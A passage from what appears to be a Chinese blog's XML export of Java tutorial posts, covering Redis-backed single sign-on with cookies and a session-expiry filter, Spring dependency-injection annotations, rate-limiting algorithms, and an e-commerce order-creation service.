使用分段锁机制来实现并发更新操作，核心类为 Segment，它继承自重入锁 ReentrantLock，并发程度与 Segment 数量相等。 JDK 1.8 使用了 CAS 操作来支持更高的并发度，在 CAS 操作失败时使用内置锁 synchronized。 并且 JDK 1.8 的实现也在链表过长时会转换为红黑树。]]></content>
      <tags>
        <tag>java容器</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[19、redis+cookie+jackson+filter实现单点登录]]></title>
    <url>%2F2018%2F07%2F21%2F19%E3%80%81redis%2Bcookie%2Bjackson%2Bfilter%E5%AE%9E%E7%8E%B0%E5%8D%95%E7%82%B9%E7%99%BB%E5%BD%95%2F</url>
    <content type="text"><![CDATA[单点登录功能实现。 1、redis连接池和api封装redis连接池12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152public class RedisPool &#123; private static JedisPool pool;//jedis连接池 //最大连接数 private static Integer maxTotal = Integer.parseInt(PropertiesUtil.getProperty("redis.max.total","20")); //最大空闲连接数 private static Integer maxIdle = Integer.parseInt(PropertiesUtil.getProperty("redis.max.idle","10")); //最小空闲连接数 private static Integer minIdle = Integer.parseInt(PropertiesUtil.getProperty("redis.min.idle","2")); //从redis中拿连接时，是否要进行验证操作，true表示一定可用，false表示要进行判断是否可用 private static Boolean testOnBorrow = Boolean.parseBoolean(PropertiesUtil.getProperty("redis.test.borrow","false")); //从redis中放回连接时，是否要进行验证操作，true表示一定可用，false表示要进行判断是否可用 private static Boolean testOnReturn = Boolean.parseBoolean(PropertiesUtil.getProperty("redis.test.return","true")); private static String redisIp = PropertiesUtil.getProperty("redis.ip"); private static Integer redisPort = Integer.parseInt(PropertiesUtil.getProperty("redis.port")); private static void initPool()&#123; JedisPoolConfig config = new JedisPoolConfig(); config.setMaxTotal(maxTotal); config.setMaxIdle(maxIdle); config.setMinIdle(minIdle); config.setTestOnBorrow(testOnBorrow); config.setTestOnReturn(testOnReturn); config.setBlockWhenExhausted(true); pool = new JedisPool(config,redisIp,redisPort,1000*2); &#125; static &#123; initPool(); &#125; public static Jedis getJedis()&#123; return pool.getResource(); &#125; public static void returnResource(Jedis jedis)&#123; pool.returnResource(jedis); &#125; public static void returnBrokenResource(Jedis jedis)&#123; pool.returnBrokenResource(jedis); &#125; public static void main(String[] args) &#123; Jedis jedis = pool.getResource(); jedis.set("jediskey","jedisvalue"); returnResource(jedis); System.out.println("program end"); &#125;&#125; 对应的参数是从snailmall.properties中取出的123456789101112131415161718#redis配置开始#redis_ipredis.ip=127.0.0.1#redis_portredis.port=6379#最大连接数redis.max.total=20#最大空闲数redis.max.idle=10#最小空闲数redis.min.idle=2#从jedis连接池获取连接时，校验并返回可用的连接redis.test.borrow=false#从jedis连接池放回连接时，校验并返回可用的连接redis.test.return=true#redis配置结束 api封装和测试123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117public class RedisPoolUtil &#123; /** * set(key,value) * @param key * @param value * @return */ public static String set(String key,String value)&#123; Jedis jedis = null; String result = null; try &#123; jedis = RedisPool.getJedis(); result = jedis.set(key,value); &#125;catch (Exception e)&#123; log.error("set key:&#123;&#125;,value:&#123;&#125;",key,value,e); RedisPool.returnBrokenResource(jedis); return result; &#125; RedisPool.returnResource(jedis); return result; &#125; /** * get * @param key * @return */ public static String get(String key)&#123; Jedis jedis = null; String result = null; try &#123; jedis = RedisPool.getJedis(); result = jedis.get(key); &#125;catch (Exception e)&#123; log.error("set key:&#123;&#125; error",key,e); RedisPool.returnBrokenResource(jedis); return result; &#125; RedisPool.returnResource(jedis); return result; &#125; /** * 用户信息放在redis session中，设置超时时间 * @param key * @param value * @param exTime 单位是秒 * @return */ public static String setEx(String key,String value,int exTime)&#123; Jedis jedis = null; String result = null; try &#123; jedis = RedisPool.getJedis(); result = jedis.setex(key,exTime,value); &#125;catch (Exception e)&#123; log.error("set key:&#123;&#125;,value:&#123;&#125;",key,value,e); RedisPool.returnBrokenResource(jedis); return result; &#125; RedisPool.returnResource(jedis); return result; &#125; /** * 用户再次请求，重新设置超时时间 * @param key * @param exTime * @return */ public static Long expire(String key,int exTime)&#123; Jedis jedis = null; Long result = null; try &#123; jedis = RedisPool.getJedis(); result = jedis.expire(key,exTime); &#125;catch (Exception e)&#123; log.error("set key:&#123;&#125;",key,e); RedisPool.returnBrokenResource(jedis); return result; &#125; RedisPool.returnResource(jedis); return result; &#125; public static Long del(String key)&#123; Jedis jedis = null; Long result = null; try &#123; jedis = RedisPool.getJedis(); result = jedis.del(key); &#125;catch (Exception e)&#123; log.error("set key:&#123;&#125; error",key,e); RedisPool.returnBrokenResource(jedis); return result; &#125; RedisPool.returnResource(jedis); return result; &#125; public static void main(String[] args) &#123; Jedis jedis = RedisPool.getJedis(); //测试set RedisPoolUtil.set("keytest","value"); //测试get String value = RedisPoolUtil.get("keytest"); //测试setnx RedisPoolUtil.setEx("keyex","valuex",60*10); //测试expire RedisPoolUtil.expire("keytest",60*20); //测试del RedisPoolUtil.del("keytest"); System.out.println("end ..."); &#125;&#125; 2、jackson序列化和反序列化新建工具类进行序列化和反序列化 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146@Slf4jpublic class JsonUtil &#123; private static ObjectMapper objectMapper = new ObjectMapper(); static &#123; //所有字段都列入进行转换 objectMapper.setSerializationInclusion(JsonSerialize.Inclusion.ALWAYS); //取消默认转换timestamp形式 objectMapper.configure(SerializationConfig.Feature.WRITE_DATES_AS_TIMESTAMPS,false); //忽略空bean转json的错误 objectMapper.configure(SerializationConfig.Feature.FAIL_ON_EMPTY_BEANS,false); //统一时间的格式 objectMapper.setDateFormat(new SimpleDateFormat(DateTimeUtil.STANDARD_FORMAT)); //忽略json存在属性，但是java对象不存在属性的错误 objectMapper.configure(DeserializationConfig.Feature.FAIL_ON_UNKNOWN_PROPERTIES,false); &#125; /** * 序列化方法，将对象转为字符串 * @param obj * @param &lt;T&gt; * @return */ public static &lt;T&gt; String obj2String(T obj)&#123; if(obj == null)&#123; return null; &#125; try &#123; return obj instanceof String ? (String) obj : objectMapper.writeValueAsString(obj); &#125; catch (IOException e) &#123; log.warn("parse object to string error",e); return null; &#125; &#125; /** * 序列化方法，同上，只是输出的格式是美化的，便于测试 * @param obj * @param &lt;T&gt; * @return */ public static &lt;T&gt; String obj2StringPretty(T obj)&#123; if(obj == null)&#123; return null; &#125; try &#123; return obj instanceof String ? (String) obj : objectMapper.writerWithDefaultPrettyPrinter().writeValueAsString(obj); &#125; catch (IOException e) &#123; log.warn("parse object to string error",e); return null; &#125; &#125; /** * 比较简单的反序列化的方法，将字符串转为单个对象 * @param str * @param clazz * @param &lt;T&gt; * @return */ public static &lt;T&gt; T String2Obj(String str,Class&lt;T&gt; clazz)&#123; if(StringUtils.isEmpty(str) || clazz == null)&#123; return null; &#125; try &#123; return clazz.equals(String.class)?(T)str:objectMapper.readValue(str,clazz); &#125; catch (IOException e) &#123; log.warn("parse string to obj error",e); return null; &#125; &#125; /** * 复杂对象的反序列化（通用） * @param str * @param typeReference * @param &lt;T&gt; * @return */ public static &lt;T&gt; T Str2Obj(String str, TypeReference typeReference)&#123; if(StringUtils.isEmpty(str) || typeReference == null)&#123; return null; &#125; try &#123; return (T) (typeReference.getType().equals(String.class)?str:objectMapper.readValue(str,typeReference)); &#125; catch (IOException e) &#123; log.warn("parse string to obj error",e); return null; &#125; &#125; /** * 第二种方式实现复杂对象的反序列化 * @param str * @param collectionClass * @param elementClasses * @param &lt;T&gt; * @return */ public static &lt;T&gt; T Str2Obj(String str,Class&lt;?&gt; collectionClass,Class&lt;?&gt;... elementClasses)&#123; JavaType javaType = objectMapper.getTypeFactory().constructParametricType(collectionClass,elementClasses); try &#123; return objectMapper.readValue(str,javaType); &#125; catch (IOException e) &#123; log.warn("parse string to obj error",e); return null; &#125; &#125; public static void main(String[] args) &#123; User user1 = new User(); user1.setId(1); user1.setUsername("user1"); //测试序列化 String userStr1 = JsonUtil.obj2String(user1); log.info("user1:&#123;&#125;",userStr1); String userStrPretty = JsonUtil.obj2StringPretty(user1); log.info("pretty user1:&#123;&#125;",userStrPretty); //反序列化 User deUser = JsonUtil.String2Obj(userStr1,User.class); log.info("deUser：&#123;&#125;",deUser); //新建第二个user对象，测试对集合对象的序列化和反序列化 User user2 = new User(); user2.setId(2); user2.setUsername("user2"); //序列化方法同上 String user2StrPretty = JsonUtil.obj2StringPretty(user2); log.info("pretty user2:&#123;&#125;",user2StrPretty); List&lt;User&gt; userList = Lists.newArrayList(); userList.add(user1); userList.add(user2); //序列化方法同上 String userListStr = JsonUtil.obj2String(userList); log.info("userLisyStr:&#123;&#125;",userListStr); //第一种反序列化的方式 List&lt;User&gt; userListObj = JsonUtil.Str2Obj(userListStr,new TypeReference&lt;List&lt;User&gt;&gt;()&#123;&#125;); log.info("userListObj:&#123;&#125;",userListObj); //第二种反序列化的方式 List&lt;User&gt; userListObj2 = JsonUtil.Str2Obj(userListStr,List.class,User.class); log.info("userListObj2:&#123;&#125;",userListObj2); &#125;&#125; 3、集群与单点登录第一步是拷贝项目，idea开两个窗口，分别启动配置nginx,用域名来访问，用权重的方式配置两个tomcat的访问。cookie的工具类123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263@Slf4jpublic class CookieUtil &#123; //tomcat8.5版本之前是可以用".oursnail.com"的，后面的版本不能那么写 private final static String COOKIE_DOMAIN = "oursnail.com"; private final static String COOKIE_NAME = "snailmall_login_token"; /** * 登陆的时候写入cookie * @param response * @param token */ public static void writeLoginToken(HttpServletResponse response,String token)&#123; Cookie ck = new Cookie(COOKIE_NAME,token); ck.setDomain(COOKIE_DOMAIN); ck.setPath("/");//设值在根目录 ck.setHttpOnly(true);//不允许通过脚本访问cookie,避免脚本攻击 ck.setMaxAge(60*60*24*365);//一年，-1表示永久,单位是秒，maxage不设置的话，cookie就不会写入硬盘，只会写在内存，只在当前页面有效 log.info("write cookieName:&#123;&#125;,cookieValue:&#123;&#125;",ck.getName(),ck.getValue()); response.addCookie(ck); &#125; /** * 读取登陆的cookie * @param request * @return */ public static String readLoginToken(HttpServletRequest request)&#123; Cookie[] cks = request.getCookies(); if(cks != null)&#123; for(Cookie ck:cks)&#123; log.info("cookieName:&#123;&#125;,cookieBValue:&#123;&#125;",ck.getName(),ck.getValue()); if(StringUtils.equals(ck.getName(),COOKIE_NAME))&#123; log.info("return cookieName:&#123;&#125;,cookieBValue:&#123;&#125;",ck.getName(),ck.getValue()); return ck.getValue(); &#125; &#125; &#125; return null; &#125; /** * 注销的时候进行删除 * @param request * @param response */ public static void delLoginToken(HttpServletRequest request,HttpServletResponse response)&#123; Cookie[] cks = request.getCookies(); if(cks != null)&#123; for(Cookie ck:cks) &#123; if(StringUtils.equals(ck.getName(),COOKIE_NAME))&#123; ck.setDomain(COOKIE_DOMAIN); ck.setPath("/"); ck.setMaxAge(0);//0表示消除此cookie log.info("del cookieName:&#123;&#125;,cookieBValue:&#123;&#125;",ck.getName(),ck.getValue()); response.addCookie(ck); return; &#125; &#125; &#125; &#125;&#125; 在login方法中将session的id存到cookie 中，并且再将其放到redis中。原来是直接将其塞到session中：1session.setAttribute(Const.CURRENT_USER,response.getData()); 因为只有一台服务器，那么同一个用户，对应同一个session id不会错误。但是现在是集群环境，打到不同的服务器上行，session id都是不一样的，所以我们需要将id发送到前端以cookie的形式保存起来，然后再用这个session id去redis中取数据。保证session的一致。 1234567891011@RequestMapping("login.do")@ResponseBodypublic ServerResponse&lt;User&gt; login(HttpSession session, String username, String password, HttpServletResponse httpServletResponse, HttpServletRequest httpServletRequest)&#123; ServerResponse response = userService.login(username,password); if(response.isSuccess())&#123; CookieUtil.writeLoginToken(httpServletResponse,session.getId()); RedisPoolUtil.setEx(session.getId(), JsonUtil.obj2String(response.getData()),Const.RedisCacheExtime.REDIS_SESSION_EXTIME); &#125; return response;&#125; 这样，我们在登陆之后，查看cookie，发现多了一个名字叫做snailmall_login_token的记录，刷新页面时，这个值是不变的。也就是说，同一个用户登录之后，无论是请求到哪个服务器上，无论是下面哪个二级子域名，这个cookie都是不变的。 后面所有需要用户信息的方法，，只需要判断cookie是否存在，然后去redis取出用户对象即可。123456String loginToken = CookieUtil.readLoginToken(httpServletRequest);if(StringUtils.isEmpty(loginToken))&#123; return ServerResponse.createByErrorMessage("用户未登陆，无法获取当前用户信息");&#125;String userJsonStr = RedisPoolUtil.get(loginToken);User currentUser = JsonUtil.Str2Obj(userJsonStr,User.class); 来取代原来的1User currentUser = (User)session.getAttribute(Const.CURRENT_USER); 改造guava缓存在一期项目中，我们使用guava对修改密码的token进行缓存，但是不能满足集群的要求。这里改为session进行存储。原来将token塞入缓存是这样写的：1TokenCache.setKey(TokenCache.TOKEN_PREFIX+username,forgetToken); 现在改为：1RedisPoolUtil.setEx(Const.TOKEN_PREFIX+username,forgetToken,60*60*12); 取token原来是这样写的：1String token = TokenCache.getKey(TokenCache.TOKEN_PREFIX+username); 现在改为：1String token = RedisPoolUtil.get(Const.TOKEN_PREFIX+username); 将其放到redis中进行缓存，那么无论哪台tomcat都可以获取到token. 刷新过期时间用户只要对该网站访问了，就应该立即重置其session的过期时间。所以要写一个过滤器来拦截请求，对其进行重置。 首先去web.xml中配置filter的入口：12345678&lt;filter&gt; &lt;filter-name&gt;sessionExpireFilter&lt;/filter-name&gt; &lt;filter-class&gt;com.swg.controller.common.SessionExpireFilter&lt;/filter-class&gt;&lt;/filter&gt;&lt;filter-mapping&gt; &lt;filter-name&gt;sessionExpireFilter&lt;/filter-name&gt; &lt;url-pattern&gt;*.do&lt;/url-pattern&gt;&lt;/filter-mapping&gt; 然后新建对应的SessionExpireFilter类：1234567891011121314151617181920212223242526public class SessionExpireFilter implements Filter&#123; @Override public void init(FilterConfig filterConfig) throws ServletException &#123; &#125; @Override public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123; HttpServletRequest request = (HttpServletRequest) servletRequest; String loginToken = CookieUtil.readLoginToken(request); if(StringUtils.isNotEmpty(loginToken))&#123; String userJsonStr = RedisShardPoolUtil.get(loginToken); User user = JsonUtil.Str2Obj(userJsonStr,User.class); if(user != null)&#123; RedisShardPoolUtil.expire(loginToken, Const.RedisCacheExtime.REDIS_SESSION_EXTIME); &#125; &#125; filterChain.doFilter(servletRequest,servletResponse); &#125; @Override public void destroy() &#123; &#125;&#125;]]></content>
      <tags>
        <tag>电商项目实战</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[19.Aware注入Spring底层组件及原理]]></title>
    <url>%2F2018%2F07%2F21%2F19.Aware%E6%B3%A8%E5%85%A5Spring%E5%BA%95%E5%B1%82%E7%BB%84%E4%BB%B6%E5%8F%8A%E5%8E%9F%E7%90%86%2F</url>
    <content type="text"><![CDATA[学习属性赋值和自动装配. 自定义组件想使用spring容器底层的一些组件，比如applicationContext或者beanFactory等。只需要实现xxxAware接口即可。在创建对象的时候，会调用接口规定的方法注入相关组件。 比如ApplicationContextAware：123public interface ApplicationContextAware extends Aware &#123; void setApplicationContext(ApplicationContext var1) throws BeansException;&#125; 那么我们可以将它传进来的ApplicationContext保存一下： 123456789public class Snail implements ApplicationContextAware&#123; private ApplicationContext applicationContext; @Override public void setApplicationContext(ApplicationContext applicationContext) throws BeansException &#123; this.applicationContext = applicationContext; &#125;&#125;]]></content>
      <tags>
        <tag>spring学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[18、二期进阶-redis快速入门]]></title>
    <url>%2F2018%2F07%2F21%2F18%E3%80%81%E4%BA%8C%E6%9C%9F%E8%BF%9B%E9%98%B6-redis%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%2F</url>
    <content type="text"><![CDATA[redis快速入门 redis快速入门————–&gt;redis快速入门]]></content>
      <tags>
        <tag>电商项目实战</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[17、二期进阶-tomcat集群（单机多服务器）]]></title>
    <url>%2F2018%2F07%2F21%2F17%E3%80%81%E4%BA%8C%E6%9C%9F%E8%BF%9B%E9%98%B6-tomcat%E9%9B%86%E7%BE%A4%EF%BC%88%E5%8D%95%E6%9C%BA%E5%A4%9A%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%89%2F</url>
    <content type="text"><![CDATA[多个tomcat的集群部署，用nginx来实现负载均衡。 tomcat集群（单机多服务器）————–&gt;tomcat集群（单机多服务器）]]></content>
      <tags>
        <tag>电商项目实战</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[18.方法、构造器位置的自动装配]]></title>
    <url>%2F2018%2F07%2F21%2F18.%E6%96%B9%E6%B3%95%E3%80%81%E6%9E%84%E9%80%A0%E5%99%A8%E4%BD%8D%E7%BD%AE%E7%9A%84%E8%87%AA%E5%8A%A8%E8%A3%85%E9%85%8D%2F</url>
    <content type="text"><![CDATA[学习属性赋值和自动装配. @Autowired能标注的位置：构造器、参数、方法、属性 写在属性上面： 12@Autowiredprivate Car car; 写在方法上： 123456//spring容器创建当前对象，就会调用方法，完成赋值；//方法使用的参数，自定义类型的值从ioc容器中获取，就是这里的参数car。@Autowiredpubllic void setCar(Car car)&#123; this.car = car;&#125; 写在构造器上： 因为注册到ioc容器的组件，容器启动的时候回调用无参构造器创建对象，然后在进行初始化赋值等操作。123456//放在有参构造器上面，这样容器启动的时候就会调用这个有参构造器//构造器中要用的组件car，也是从容器中获取@Autowiredpubllic Boss(Car car)&#123; this.car = car;&#125; 如果当前类只有一个有参构造器，@Autowired是可以省略的。 写在参数前面： 1234//car都是从容器中获取的publlic void setCar(@Autowired Car car)&#123; this.car = car;&#125;]]></content>
      <tags>
        <tag>spring学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[17.@Resource & @Inject]]></title>
    <url>%2F2018%2F07%2F21%2F17.%40Resource%20%26%20%40Inject%2F</url>
    <content type="text"><![CDATA[学习属性赋值和自动装配. 这两个都是java规范的注解。 @Resource–JSR250 默认是按照组件名称进行装配的。没有能支持@Primary和@Autowired（required=false）这个功能。 @Inject–JSR330 还需要一个依赖：javax.inject 和@Autowired差不多，但是比@Autowired稍弱，虽然支持@Primary，但是没有required=false @Autowired是spring定义的，后两者都是java的规范。 那么这些自动装配功能的注解是如何实现的呢？原来是AutowiredAnnotationBeanPostProcessor来实现的。]]></content>
      <tags>
        <tag>spring学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[16.@Autowired & @Qualifier & @Primary]]></title>
    <url>%2F2018%2F07%2F21%2F16.%40Autowired%20%26%20%40Qualifier%20%26%20%40Primary%2F</url>
    <content type="text"><![CDATA[学习属性赋值和自动装配. @Autowired：默认是按照类型去容器中找相应的组件。找到就赋值。 applicationContext.getBean(Person.class) 如果找到多个相同类型的组件，再将属性名(默认是小写字母开头的id或者用@Bean(&quot;xxx&quot;)中的xxx为属性名)作为组件的id去容器中查找。 applicationContext.getBean(“person”) 所以，最好名字不一样。 如果有多个相同类型的组件，可以用@Qualifier(&quot;xxx&quot;)可以指定装配的id，而不是属性名。 @Primary：让spring自动装配的时候，默认使用首选的bean；但是如果@Qualifier明确指定了要装配哪一个，还是以@Qualifier为准。 默认，如果容器中没有这个组件，那么@Autowired就会报错。那么可不可以有就装配，没有就算了呢？ @Autowired（required=false）]]></content>
      <tags>
        <tag>spring学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[16、二期进阶-maven环境隔离]]></title>
    <url>%2F2018%2F07%2F21%2F16%E3%80%81%E4%BA%8C%E6%9C%9F%E8%BF%9B%E9%98%B6-maven%E7%8E%AF%E5%A2%83%E9%9A%94%E7%A6%BB%2F</url>
    <content type="text"><![CDATA[maven环境隔离，区分各种环境，减少人为改动带来的坑。 maven环境隔离————–&gt;maven环境隔离]]></content>
      <tags>
        <tag>电商项目实战</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[15、阿里云centos7.3部署本项目（后端+前端）]]></title>
    <url>%2F2018%2F07%2F21%2F15%E3%80%81%E9%98%BF%E9%87%8C%E4%BA%91centos7.3%E9%83%A8%E7%BD%B2%E6%9C%AC%E9%A1%B9%E7%9B%AE%EF%BC%88%E5%90%8E%E7%AB%AF%2B%E5%89%8D%E7%AB%AF%EF%BC%89%2F</url>
    <content type="text"><![CDATA[实际部署到阿里云服务器。 阿里云centos7.3部署本项目（后端+前端）————–&gt;阿里云centos7.3部署本项目（后端+前端）]]></content>
      <tags>
        <tag>电商项目实战</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[15.高并发处理之应用限流思路]]></title>
    <url>%2F2018%2F07%2F21%2F15.%E9%AB%98%E5%B9%B6%E5%8F%91%E5%A4%84%E7%90%86%E4%B9%8B%E5%BA%94%E7%94%A8%E9%99%90%E6%B5%81%E6%80%9D%E8%B7%AF%2F</url>
    <content type="text"><![CDATA[这里简单介绍几种限流算法，提供一种应对高并发的解决思路。 为什么要进行限流？ 限流算法计数器法有时我们还会使用计数器来进行限流，主要用来限制一定时间内的总并发数，比如数据库连接池、线程池、秒杀的并发数；计数器限流只要一定时间内的总请求数超过设定的阀值则进行限流，是一种简单粗暴的总数量限流，而不是平均速率限流。 算法思想很简单，但是有一个致命的问题：临界问题 滑动窗口 漏桶算法漏桶一个固定容量的漏桶，按照固定常量速率流出请求，流入请求速率任意，当流入的请求数累积到漏桶容量时，则新流入的请求被拒绝。漏桶可以看做是一个具有固定容量、固定流出速率的队列，漏桶限制的是请求的流出速率。漏桶中装的是请求。 令牌桶算法令牌桶是一个存放固定容量令牌的桶，按照固定速率往桶里添加令牌，填满了就丢弃令牌，请求是否被处理要看桶中令牌是否足够，当令牌数减为零时则拒绝新的请求。令牌桶允许一定程度突发流量，只要有令牌就可以处理，支持一次拿多个令牌。令牌桶中装的是令牌。 其主要思想是：每隔固定时间往令牌桶里放令牌，突发请求来的时候，令牌桶里的数量够的话，就删除对应请求个数的令牌；令牌桶的数量不够的话，那么则不会删除令牌，且该数据包将被限流（要么丢弃，要么缓冲区等待）。 计数器算法VS滑动窗口计数器算法可以看作是滑动窗口的低精度的实现，滑动窗口精度高，但是需要的存储空间更大，因为每一个格子都需要一个计数器。 漏桶算法VS令牌桶算法 令牌桶是按照固定速率往桶中添加令牌，请求是否被处理需要看桶中令牌是否足够，当令牌数减为零时则拒绝新的请求； 漏桶则是按照常量固定速率流出请求，流入请求速率任意，当流入的请求数累积到漏桶容量时，则新流入的请求被拒绝； 令牌桶限制的是平均流入速率（允许突发请求，只要有令牌就可以处理，支持一次拿3个令牌，4个令牌），并允许一定程度突发流量； 漏桶限制的是常量流出速率（即流出速率是一个固定常量值，比如都是1的速率流出，而不能一次是1，下次又是2），从而平滑突发流入速率； 令牌桶允许一定程度的突发，而漏桶主要目的是平滑流入速率； 两个算法实现可以一样，但是方向是相反的，对于相同的参数得到的限流效果是一样的。 可以参考：http://jinnianshilongnian.iteye.com/blog/2305117 还有一些其他的高可用的思路： 高并发处理之服务降级与服务熔断思路服务降级分类自动降级：超时、失败次数、故障、限流 人工降级：秒杀，双11大促 数据库切库分库分表思路数据量大的时候，数据库分库分表]]></content>
      <tags>
        <tag>java并发进阶</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[15.@PropertySource加载外部配置文件]]></title>
    <url>%2F2018%2F07%2F21%2F15.%40PropertySource%E5%8A%A0%E8%BD%BD%E5%A4%96%E9%83%A8%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[学习属性赋值和自动装配. ${}注入属性文件的值 新建一个配置文件properties，在里面写: person.nickname = hello 首先在配置类中声明要引入的配置文件： @PropertySource(value = “classpath:/db.properties”) 然后再引入： 12@Value("$&#123;person.nickname&#125;")private String nickname; 以前在用xml的时候，是这样引入这个值的： 12345&lt;context:property-placeholder location=&quot;db.properties&quot;/&gt;//然后下面就引入这个属性文件的值&lt;property name=&quot;nickname&quot; value=&quot;$&#123;person.nickname&#125;&quot;/&gt; 自动装配：spring利用依赖注入DI，完成对IOC容器中各个组件依赖关系赋值]]></content>
      <tags>
        <tag>spring学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[14、订单模块开发]]></title>
    <url>%2F2018%2F07%2F21%2F14%E3%80%81%E8%AE%A2%E5%8D%95%E6%A8%A1%E5%9D%97%E5%BC%80%E5%8F%91%2F</url>
    <content type="text"><![CDATA[订单模块开发 前台订单接口1.创建订单request http://localhost:8080/order/create.do?shippingId=5 success1234567891011121314151617181920212223242526272829&#123; &quot;status&quot;: 0, &quot;data&quot;: &#123; &quot;orderNo&quot;: 1485158223095, &quot;payment&quot;: 2999.11, &quot;paymentType&quot;: 1, &quot;postage&quot;: 0, &quot;status&quot;: 10, &quot;paymentTime&quot;: null, &quot;sendTime&quot;: null, &quot;endTime&quot;: null, &quot;closeTime&quot;: null, &quot;createTime&quot;: 1485158223095, &quot;orderItemVoList&quot;: [ &#123; &quot;orderNo&quot;: 1485158223095, &quot;productId&quot;: 2, &quot;productName&quot;: &quot;oppo R8&quot;, &quot;productImage&quot;: &quot;mainimage.jpg&quot;, &quot;currentUnitPrice&quot;: 2999.11, &quot;quantity&quot;: 1, &quot;totalPrice&quot;: 2999.11, &quot;createTime&quot;: null &#125; ], &quot;shippingId&quot;: 5, &quot;shippingVo&quot;: null &#125;&#125; fail1234&#123; &quot;status&quot;: 1, &quot;msg&quot;: &quot;创建订单失败&quot;&#125; controller123456789@RequestMapping("create.do")@ResponseBodypublic ServerResponse create(HttpSession session, Integer shippingId)&#123; User user = (User)session.getAttribute(Const.CURRENT_USER); if(user ==null)&#123; return ServerResponse.createByErrorCodeMessage(ResponseEnum.NEED_LOGIN.getCode(),ResponseEnum.NEED_LOGIN.getDesc()); &#125; return orderService.createOrder(user.getId(),shippingId);&#125; service123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193@Overridepublic ServerResponse createOrder(Integer userId, Integer shippingId) &#123; //1.根据userId获取cartList List&lt;Cart&gt; cartList = cartMapper.selectCartByUserId(userId); //2.根据userId,cartList获取orderItemList ServerResponse response = this.getCartOrderItem(userId,cartList); if(!response.isSuccess())&#123; return response; &#125; List&lt;OrderItem&gt; orderItemList = (List&lt;OrderItem&gt;) response.getData(); if(CollectionUtils.isEmpty(orderItemList))&#123; return ServerResponse.createByErrorMessage("购物车为空"); &#125; //3.计算总价 BigDecimal payment = this.getOrderTotalPrice(orderItemList); //4.生成订单Order Order order = this.assembleOrder(userId,shippingId,payment); if(order == null)&#123; return ServerResponse.createByErrorMessage("生成订单失败"); &#125; //5.给所有orderItem塞入orderNo for(OrderItem orderItem:orderItemList)&#123; orderItem.setOrderNo(order.getOrderNo()); &#125; //6.批量插入orderItem orderItemMapper.batchInsert(orderItemList); //7.减少相应的库存 this.reduce(orderItemList); //8.清空购物车 this.cleanCart(cartList); //9.返回给前端的数据 OrderVo orderVo = assembleOrderVo(order,orderItemList); return ServerResponse.createBySuccess(orderVo);&#125;//assembleOrderVoprivate OrderVo assembleOrderVo(Order order,List&lt;OrderItem&gt; orderItemList)&#123; OrderVo orderVo = new OrderVo(); orderVo.setOrderNo(order.getOrderNo()); orderVo.setPayment(order.getPayment()); orderVo.setPaymentType(order.getPaymentType()); orderVo.setPaymentTypeDesc(Const.PaymentTypeEnum.codeOf(order.getPaymentType()).getValue()); orderVo.setPostage(order.getPostage()); orderVo.setStatus(order.getStatus()); orderVo.setStatusDesc(Const.OrderStatusEnum.codeOf(order.getStatus()).getValue()); orderVo.setShippingId(order.getShippingId()); Shipping shipping = shippingMapper.selectByPrimaryKey(order.getShippingId()); if(shipping != null)&#123; orderVo.setReceiverName(shipping.getReceiverName()); orderVo.setShippingVo(assembleShippingVo(shipping)); &#125; orderVo.setPaymentTime(DateTimeUtil.dateToStr(order.getPaymentTime())); orderVo.setSendTime(DateTimeUtil.dateToStr(order.getSendTime())); orderVo.setEndTime(DateTimeUtil.dateToStr(order.getEndTime())); orderVo.setCreateTime(DateTimeUtil.dateToStr(order.getCreateTime())); orderVo.setCloseTime(DateTimeUtil.dateToStr(order.getCloseTime())); orderVo.setImageHost(PropertiesUtil.getProperty("ftp.server.http.prefix")); List&lt;OrderItemVo&gt; orderItemVoList = Lists.newArrayList(); for(OrderItem orderItem : orderItemList)&#123; OrderItemVo orderItemVo = assembleOrderItemVo(orderItem); orderItemVoList.add(orderItemVo); &#125; orderVo.setOrderItemVoList(orderItemVoList); return orderVo;&#125;//assembleOrderItemVoprivate OrderItemVo assembleOrderItemVo(OrderItem orderItem)&#123; OrderItemVo orderItemVo = new OrderItemVo(); orderItemVo.setOrderNo(orderItem.getOrderNo()); orderItemVo.setProductId(orderItem.getProductId()); orderItemVo.setProductName(orderItem.getProductName()); orderItemVo.setProductImage(orderItem.getProductImage()); orderItemVo.setCurrentUnitPrice(orderItem.getCurrentUnitPrice()); orderItemVo.setQuantity(orderItem.getQuantity()); orderItemVo.setTotalPrice(orderItem.getTotalPrice()); orderItemVo.setCreateTime(DateTimeUtil.dateToStr(orderItem.getCreateTime())); return orderItemVo;&#125;//assembleShippingVoprivate ShippingVo assembleShippingVo(Shipping shipping)&#123; ShippingVo shippingVo = new ShippingVo(); shippingVo.setReceiverName(shipping.getReceiverName()); shippingVo.setReceiverAddress(shipping.getReceiverAddress()); 